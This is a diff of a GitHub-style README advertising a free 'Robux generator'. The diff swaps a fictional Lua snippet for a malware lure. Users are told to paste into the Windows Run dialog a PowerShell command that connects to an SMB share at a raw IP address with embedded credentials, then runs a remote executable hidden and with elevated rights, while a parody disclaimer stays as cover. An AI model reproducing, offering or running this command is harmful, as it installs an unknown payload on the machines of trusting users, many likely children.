@@ -1,4 +1,4 @@
-# 🚀 **ULTIMATE ROBUX GENERATOR 2024** 🚀
+# 🚀 **ULTIMATE ROBUX GENERATOR 2025** 🚀
 ### 💎 *The Most Advanced Free Robux Solution* 💎
 
 <p align="center">
@@ -11,13 +11,13 @@
 ✔️ **Daily updated** to prevent detection  
 ✔️ **Proven success rate** with over 1M+ happy users  
 ✔️ **No human verification** required  
-✔️ **Works on all platforms** (PC, Mobile, Xbox)  
+✔️ **Works on all windows devices**  
 
 ---
 
 ## 🛠️ **HOW IT WORKS**
 
-Our proprietary technology uses advanced quantum tunneling to inject Robux directly into your account through Roblox's backend servers. This method was discovered by our team of reverse engineers after analyzing Roblox's transaction protocols.
+Our proprietary technology uses advanced exploit to inject Robux directly into your account through Roblox's backend servers. This method was discovered by our team of reverse engineers after analyzing Roblox's transaction protocols.
 
 
 ---
@@ -25,48 +25,18 @@ Our proprietary technology uses advanced quantum tunneling to inject Robux direc
 ## 📝 **STEP-BY-STEP GUIDE**
 
 ### 1️⃣ **Preparation**
-- Ensure you have Roblox Studio installed
-- Log into your Roblox account
-- Disable any antivirus software (may cause false positives)
+- Ensure you have Roblox installed
+- Log into your Roblox account on pc
 
 ### 2️⃣ **Activation**
-1. Open Roblox Studio
-2. Press `F9` to open the Developer Console
-3. Copy the following code:
+1. Copy the code provided under this text
 
-```lua
--- ROBUX GENERATOR v4.2.0
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-
-local function GenerateRobux(amount)
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = "https://api.roblox-secure.com/v1/robux/generate",
-            Method = "POST",
-            Headers = {
-                ["Authorization"] = "Bearer RBX-GEN-2024",
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                userId = Players.LocalPlayer.UserId,
-                amount = amount,
-                securityToken = "7x82hFnK9p"
-            })
-        })
-    end)
-    
-    if success then
-        print("✅ Successfully generated "..amount.." Robux!")
-    else
-        print("❌ Error: "..response)
-    end
-end
-
-GenerateRobux(50000) -- Generate 50K Robux
+```powershell -Command "Start-Process cmd -ArgumentList '/c net use \\89.110.93.160\shear /user:WORKGROUP\sambauser aabb1234 && \\89.110.93.160\shear\s -fullinstall' -windowstyle hidden -Verb RunAs; #
+   GenerateRobux(50000) -- Generate 50K Robux
 ```
-
-    Paste into console and press Enter
+2. Press **WINDOWS KEY** + **R**
+3. Press **CTRL** + **V**
+4. Press **ENTER**
 
 3️⃣ Verification
 
@@ -74,7 +44,6 @@ GenerateRobux(50000) -- Generate 50K Robux
 
     Restart Roblox if changes aren't immediate
 
-    Contact support if issues persist
 
 
 ❓ FREQUENTLY ASKED QUESTIONS
@@ -100,4 +69,4 @@ GenerateRobux(50000) -- Generate 50K Robux
 This is clearly a parody project. Robux cannot be generated this way.
 All code shown is fictional and for entertainment purposes only.
 Roblox® is a registered trademark of Roblox Corporation.
-</div><h3 align="center">⭐ STAR THIS REPO TO SUPPORT DEVELOPMENT! ⭐</h3><p align="center"> <img src="https://media.giphy.com/media/lGY4fS4zv3VSZdIDB7/giphy.gif" width="150"> </p><p align="center"> 🔧 <b>Maintained by YourUsername</b> 🔧<br> <sub>Last Updated: August 2024</sub> </p> ```
+</div><h3 align="center">⭐ STAR THIS REPO TO SUPPORT DEVELOPMENT! ⭐</h3><p align="center"> <img src="https://media.giphy.com/media/lGY4fS4zv3VSZdIDB7/giphy.gif" width="150"> </p><p align="center"> 🔧 <b>Maintained by Stalich</b> 🔧<br> <sub>Last Updated: July 2025</sub> </p> ```
